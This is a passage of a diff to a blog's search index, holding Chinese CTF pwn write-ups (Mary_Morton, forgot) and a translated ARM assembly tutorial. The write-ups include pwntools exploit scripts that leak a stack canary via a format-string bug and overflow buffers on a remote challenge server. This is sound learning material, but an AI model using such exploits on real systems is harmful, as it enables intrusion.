@@ -48,92 +48,98 @@
       </tags>
   </entry>
   <entry>
-    <title>Mary_Morton</title>
-    <url>/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/0.png" class></strong></p>
+    <title>Part 1: ARM汇编介绍</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-1-ARM%E6%B1%87%E7%BC%96%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-1-ARM%E6%B1%87%E7%BC%96%E4%BB%8B%E7%BB%8D/0.png" class></strong></p>
  <a id="more"></a>
 
-<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/4.png" class></strong></p>
-<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/1.png" class></strong></p>
-<p>开启了Canary机制，并且设置了不可执行栈。</p>
-<h3 id="查找可疑的字符串"><a href="#查找可疑的字符串" class="headerlink" title="查找可疑的字符串"></a>查找可疑的字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/2.png" class></strong></p>
-<p>其函数的地址为：0x4008DA</p>
-<h3 id="函数执行逻辑"><a href="#函数执行逻辑" class="headerlink" title="函数执行逻辑"></a>函数执行逻辑</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4009FF();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the battle ! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Great Fairy] level pwned &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Select your weapon &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4009DA();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_4008EB();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      sub_400960();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4009DA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Stack Bufferoverflow Bug &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Format String Bug &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;3. Exit the battle &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化字符串漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓冲区溢出漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>欢迎来到ARM汇编基础教程，这套教程是为了让你可以在ARM架构下进行漏洞利用打基础的。在我们能开始写ARM的shellcode以及构建ROP链之前，我们需要先学习相关的ARM汇编基础知识。</p>
+<p>这些基础知识包括：</p>
+<p><a href="https://azeria-labs.com/writing-arm-assembly-part-1/">Part 1：ARM汇编介绍</a></p>
+<p><a href="https://azeria-labs.com/arm-data-types-and-registers-part-2/">Part 2：数据类型寄存器</a></p>
+<p><a href="https://azeria-labs.com/arm-instruction-set-part-3/">Part 3: ARM指令集</a></p>
+<p><a href="https://azeria-labs.com/memory-instructions-load-and-store-part-4/">Part 4: 内存相关指令：加载以及存储</a></p>
+<p><a href="https://azeria-labs.com/load-and-store-multiple-part-5/">Part 5：重复性加载及存储</a></p>
+<p><a href="https://azeria-labs.com/arm-conditional-execution-and-branching-part-6/">Part 6: 分支和条件执行</a></p>
+<p><a href="https://azeria-labs.com/functions-and-the-stack-part-7/">Part 7：栈以及函数</a></p>
+<p>为了能跟着这个系列教程动手实践，你可以准备一个ARM的运行环境。如果你没有ARM设备（比如说树莓派或者手机），你可以通过QEMU来创建一个，[<a href="https://azeria-labs.com/emulate-raspberry-pi-with-qemu/">教程在这]</a>。如果你对于GDB调试的基础命令不熟悉的话，可以通过[<a href="https://azeria-labs.com/debugging-with-gdb-introduction/">这个]</a>学习。在这篇教程中，我们的核心关注点为32位的ARM，相关的例子在ARMv6下编译。</p>
+<h2 id="为什么是ARM？"><a href="#为什么是ARM？" class="headerlink" title="为什么是ARM？"></a><strong>为什么是ARM？</strong></h2><p>前面说过，本系列教程的核心目的，是为那些想学习在ARM架构下进行漏洞利用的人而准备。可以看看你身边，有多少设备是ARM架构的， 手机，路由器，以及IOT设备，很多都是ARM架构的。无疑ARM架构已经成为了全世界主流而广泛的CPU架构。所以我们面对的越来越多的安全问题，也都会是ARM架构下的，那么在这种架构下的开发以及漏洞利用，也会成为一种主流趋势。</p>
+<p>我们在X86架构上进行了很多研究，而ARM可能是最简单的广泛使用的汇编语言。但是人们为什么不关注ARM呢？可能是在intel架构上可供漏洞利用的学习资料比ARM多得多吧。比如[<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Corelan Team]</a>写的很棒的intel X86漏洞利用教程，旨在帮助我们可以更准确更高效的学习到关键的漏洞利用基础知识。如果你对于x86漏洞利用很感兴趣，那我觉得Corelan Team的教程是一个不错的选择。但是在我们这个系列里，我们要创造一本高效的ARM架构下的漏洞利用新手手册。</p>
+<h2 id="ARM-VS-INTEL"><a href="#ARM-VS-INTEL" class="headerlink" title="ARM VS. INTEL"></a><strong>ARM VS. INTEL</strong></h2><p>ARM处理器Intel处理器有很多不同，但是最主要的不同怕是指令集了。Intel属于复杂指令集（CISC）处理器，有很多特性丰富的访问内存的复杂指令集。因此它拥有更多指令代码以及取址都是，但是寄存器比ARM的要少。复杂指令集处理器主要被应用在PC机，工作站以及服务器上。</p>
+<p>ARM属于简单指令集（RISC）处理器，所以与复杂指令集先比，只有简单的差不多100条指令集，但会有更多的寄存器。与Intel不同，ARM的指令集仅仅操作寄存器或者是用于从内存的加载/储存过程，这也就是说，简单的加载/存储指令即可访问到内存。这意味着在ARM中，要对特定地址中存储的的32位值加一的话，仅仅需要从内存中加载到寄存器，加一，再从寄存器储存到内存即可。</p>
+<p>简单的指令集既有好处也有坏处。一个好处就是代码的执行变得更快了。（RISC指令集允许通过缩短时钟周期来加速代码执行）。坏处就是更少的指令集也要求了编写代码时要更加注意指令间使用的关系以及约束。还有重要的一点，ARM架构有两种模式，ARM模式和Thumb模式。Thumb模式的代码只有2或者4字节。</p>
+<p>ARM与X86的不同还体现在：</p>
+<p>ARM中很多指令都可以用来做为条件执行的判断依据</p>
+<p>X86与X64机器码使用小端格式</p>
+<p>ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。</p>
+<p>除了以上这些ARM与Intel间的差异，ARM自身也有很多版本。本系列教程旨在尽力保持通用性的情况下来讲讲ARM的工作流程。而且当你懂得了这个形式，学习其他版本的也很容易了。在系列教程中使用的样例都是在32位的ARMv6下运行的，所以相关解释也是主要依赖这个版本的。</p>
+<p>不同版本的ARM命名也是有些复杂：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-1-ARM%E6%B1%87%E7%BC%96%E4%BB%8B%E7%BB%8D/1.png" class></strong></p>
+<h2 id="写ARM汇编"><a href="#写ARM汇编" class="headerlink" title="写ARM汇编"></a><strong>写ARM汇编</strong></h2><p>在开始用ARM汇编做漏洞利用开发之前，还是需要先学习下基础的汇编语言知识的。为什么我们需要ARM汇编呢，用正常的变成语言写不够么？的确不够，因为如果我们想做逆向工程，或者理解相关二进制程序的执行流程，构建我们自己的ARM架构的shellcode，ROP链，以及调试ARM应用，这些都要求先懂得ARM汇编。当然你也不需要学习的太过深入，足够做逆向工作以及漏洞利用开发刚刚好。如果有些知识要求先了解一些背景知识，别担心，这些知识也会在本系列文章里面介绍到的。当然如果你想学习更多，也可以去本文末尾提供的相关链接学习。</p>
+<p>ARM汇编，是一种更容易被人们接受的汇编语言。当然我们的计算机也不能直接运行汇编代码，还是需要编译成机器码的。通过编译工具链中<strong>as</strong>程序来将文件后缀为”.s”的汇编代码编译成机器码。写完汇编代码后，一般保存后缀为”.s”的文件，然后你需要用<strong>as</strong>编译以及用<strong>ld</strong>链接程序:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ as program.s -o program.o</span><br><span class="line">$ ld program.o -o program</span><br></pre></td></tr></table></figure>
 
-<p>输入v3=1，跳转到缓冲区溢出漏洞，如果不存在canary保护机制，则可以直接覆盖返回地址跳转到system函数。</p>
-<p>输入v3=2，跳转到格式化字符串漏洞，可以打印出栈上Canary，之后利用缓冲区溢出覆盖即可。</p>
-<p>输入v3=3，退出程序</p>
-<h3 id="绕过Canary机制"><a href="#绕过Canary机制" class="headerlink" title="绕过Canary机制"></a>绕过Canary机制</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/3.png" class></strong></p>
-<p>看一下流程图和汇编可以知道readsqword这个地方有canary保护，只有 rax 和fs：28h 两个值相等的时候  才能跳转到返回值，反之则调用stack_chk_fail。</p>
-<p>根据程序可以看出，v2应该就是canary的值，一开始，将_readfsqword(0x28u)的值给v2，后来又和v2做异或操作，只有v2与它还相等，程序返回0，否则返回不为零的数。</p>
-<h3 id="泄露v2（Canary）的值"><a href="#泄露v2（Canary）的值" class="headerlink" title="泄露v2（Canary）的值"></a>泄露v2（Canary）的值</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/6.png" class></strong></p>
-<p>程序中<a href="https://xz.aliyun.com/t/7398">格式化字符串漏洞</a>为</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);  </span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br></pre></td></tr></table></figure>
+<p><strong><img src="/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-1-ARM%E6%B1%87%E7%BC%96%E4%BB%8B%E7%BB%8D/2.gif" class></strong></p>
+<h2 id="汇编语言本质"><a href="#汇编语言本质" class="headerlink" title="汇编语言本质"></a><strong>汇编语言本质</strong></h2><p>让我们来看看汇编语言的底层本质。在最底层，只有电路的电信号。信号被格式化成可以变化的高低电平0V(off)或者5V(on)。但是通过电压变化来表述电路状态是繁琐的，所以用0和1来代替高低电平，也就有了二进制格式。由二进制序列组成的组合便是最小的计算机处理器工作单元了，比如下面的这句机器码序列就是例子。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1110 0001 1010 0000 0010 0000 0000 0001</span><br></pre></td></tr></table></figure>
 
-<p>程序将输入的<code>AAAA</code>存入buf中，之后格式化字符串打印出了其对应的ASCII码，因此可以计算出格式化字符串中<code>&amp;buf</code>的偏移量，即<code>&amp;buf</code>在第6个参数的位置。</p>
-<p>根据IDA的注释，我们知道buf在<code>rbp-90h</code>，v2在<code>rbp-8h</code>，canary与我们输入参数的偏移为<code>0x90 - 0x8 = 0x88</code>，然后八个字节为一组，<code>0x88 / 8 = 17</code>，因此Canary即v2在格式化字符串的第<code>17 + 6 = 23</code>参数的位置。</p>
+<p>看上去不错，但是我们还是不能记住这些组合的含义。所以，我们需要用助记符和缩写来帮助我们记住这些二进制组合。这些助记符一般是连续的三个字母，我们可以用这些助记符作为指令来编写程序。这种程序就叫做汇编语言程序。用以代表一种计算机的机器码的助记符集合就叫做这种计算机汇编语言。因此，汇编语言是人们用来编写程序的最底层语言。同时指令的操作符也有对应的助记符，比如：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MOV R2, R1</span><br></pre></td></tr></table></figure>
+
+<p>现在我们知道了汇编程序是助记符的文本信息集合，我们需要将其转换成机器码。就像之前的，在[<a href="https://www.gnu.org/software/binutils/">GNU Binutils]</a>工程中提供了叫做<strong>as</strong>的工具。使用汇编工具去将汇编语言转换成机器码的过程叫做汇编(assembling)。(参考：<a href="https://zhuanlan.zhihu.com/p/111500914">gcc生成可执行文件的过程</a>)</p>
+<p>总结一下，在这篇中我们学习了计算机是通过由0101代表高低电平的机器码序列来进行运算的。我们可以使用机器码去让计算机做我们想让它做的事情。不过因为我们不能记住机器码，我们使用了缩写助记符来代表有相关功能的机器码，这些助记符的集合就是汇编语言。最后我们使用汇编器将汇编语言转换成机器可以理解的机器码。当然，在更高级别的语言编译生成机器码过程中，核心原理也是这个。</p>
+<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a><strong>拓展阅读</strong></h2><ol>
+<li><p><a href="https://www.coranac.com/tonc/text/asm.htm">Whirlwind Tour of ARM Assembly.</a></p>
+</li>
+<li><p><a href="http://thinkingeek.com/arm-assembler-raspberry-pi/">ARM assembler in Raspberry Pi.</a></p>
+</li>
+<li><p>Practical Reverse Engineering: x86, x64, ARM, Windows Kernel, Reversing Tools, and Obfuscation by Bruce Dang, Alexandre Gazet, Elias Bachaalany and Sebastien Josse.</p>
+</li>
+<li><p><a href="http://infocenter.arm.com/help/topic/com.arm.doc.dui0068b/index.html">ARM Reference Manual.</a></p>
+</li>
+<li><p><a href="http://www.keil.com/support/man/docs/armasm/default.htm">Assembler User Guide.</a></p>
+</li>
+</ol>
 <blockquote>
-<p>基本的格式化字符串参数</p>
-<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
-<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
-<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
-<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
-<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
-<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%​$hn或%$hhn来适时调整。</p>
-<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
+<p>译文仅供参考，具体内容表达以及含义以原文为准</p>
 </blockquote>
-<p>注意%p、%x会直接打印栈上存储的值，而%s会打印栈上存储值所指向地址的值。</p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p>payload的构造：覆盖返回地址，需要0x90-0x8=0x88覆盖局部变量，然后放上canary的值，在填充8个“a”覆盖ebp（64位程序），最后加上system的返回地址。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49747</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">print(canary)</span><br><span class="line"> </span><br><span class="line">flag_addr = <span class="number">0x4008da</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b&#x27;deafbeef&#x27;</span> + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/5.png" class></strong></p>
 ]]></content>
       <categories>
-        <category>PWN</category>
-        <category>AD_World</category>
+        <category>ARM汇编</category>
       </categories>
       <tags>
-        <tag>PWN</tag>
-        <tag>Stack</tag>
+        <tag>ARM</tag>
       </tags>
   </entry>
   <entry>
-    <title>forgot</title>
-    <url>/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/6.png" class></strong></p>
-<h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/1.png" class></strong></p>
-<h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/2.png" class></strong></p>
-<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
-<h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/3.png" class></strong></p>
-<p>找到其调用函数的位置</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/4.png" class></strong></p>
-<p>查看sub_80486CC函数所在地址（这里函数名称就对应其地址）</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/5.png" class></strong></p>
-<p>其函数所在地址0x080486CC，注意这里调用system函数需要传递<strong>cat flag</strong>参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。</p>
-<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/7.png" class></strong></p>
-<p>v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/8.png" class></strong></p>
-<p>即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/9.png" class></strong></p>
-<p>查看其ASCII码对应的字符为：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/10.png" class></strong></p>
-<p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/11.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>AD_World</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>Stack</tag>
-      </tags>
+    <title>Part 2: 数据类型寄存器</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Part 3: Arm指令集</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-3-Arm%E6%8C%87%E4%BB%A4%E9%9B%86/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Part 4: 内存相关指令——加载以及存储</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-4-%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4%E2%80%94%E2%80%94%E5%8A%A0%E8%BD%BD%E4%BB%A5%E5%8F%8A%E5%AD%98%E5%82%A8/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Part 6:: 分支和条件执行</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-6-%E5%88%86%E6%94%AF%E5%92%8C%E6%9D%A1%E4%BB%B6%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Part 5: 重复性加载及存储</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-5-%E9%87%8D%E5%A4%8D%E6%80%A7%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%AD%98%E5%82%A8/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Part 7: 栈以及函数</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-7-%E6%A0%88%E4%BB%A5%E5%8F%8A%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>Heap I</title>
@@ -301,6 +307,94 @@
       </tags>
   </entry>
   <entry>
+    <title>Mary_Morton</title>
+    <url>/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/4.png" class></strong></p>
+<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/1.png" class></strong></p>
+<p>开启了Canary机制，并且设置了不可执行栈。</p>
+<h3 id="查找可疑的字符串"><a href="#查找可疑的字符串" class="headerlink" title="查找可疑的字符串"></a>查找可疑的字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/2.png" class></strong></p>
+<p>其函数的地址为：0x4008DA</p>
+<h3 id="函数执行逻辑"><a href="#函数执行逻辑" class="headerlink" title="函数执行逻辑"></a>函数执行逻辑</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4009FF();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the battle ! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Great Fairy] level pwned &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Select your weapon &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4009DA();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_4008EB();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      sub_400960();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span 